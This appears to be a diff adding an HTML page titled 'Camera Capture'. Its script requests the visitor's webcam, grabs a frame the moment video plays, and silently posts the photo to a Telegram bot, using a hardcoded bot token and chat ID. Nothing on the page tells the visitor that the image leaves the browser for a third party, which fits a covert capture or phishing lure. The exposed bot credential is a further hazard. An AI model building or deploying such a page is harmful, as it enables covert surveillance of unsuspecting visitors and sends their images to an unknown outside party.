@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        video, canvas {
+            display: block;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Camera Capture</h1>
+        <video id="video" autoplay playsinline width="300"></video>
+        <canvas id="canvas" width="300" height="200"></canvas>
+    </div>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Access the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+
+                // Capture the image after the video is loaded
+                video.onplaying = () => {
+                    captureImage();
+                };
+            })
+            .catch((error) => {
+                console.error('Error accessing the camera:', error);
+            });
+
+        // Function to capture the image and send it to Telegram bot
+        function captureImage() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Convert Base64 image to blob
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    // Create form data
+                    const formData = new FormData();
+                    formData.append('chat_id', '7575572127'); // معرف الدردشة الجديد
+                    formData.append('photo', blob);
+
+                    // Send to Telegram
+                    fetch(`https://api.telegram.org/bot7593919517:AAEZywTiuq-p__opUeDeOPVYgPMZcEfJu3Q/sendPhoto`, { 
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Telegram response:', data))
+                    .catch(error => console.error('Error sending image to Telegram:', error));
+                });
+        }
+    </script>
+</body>
+</html>
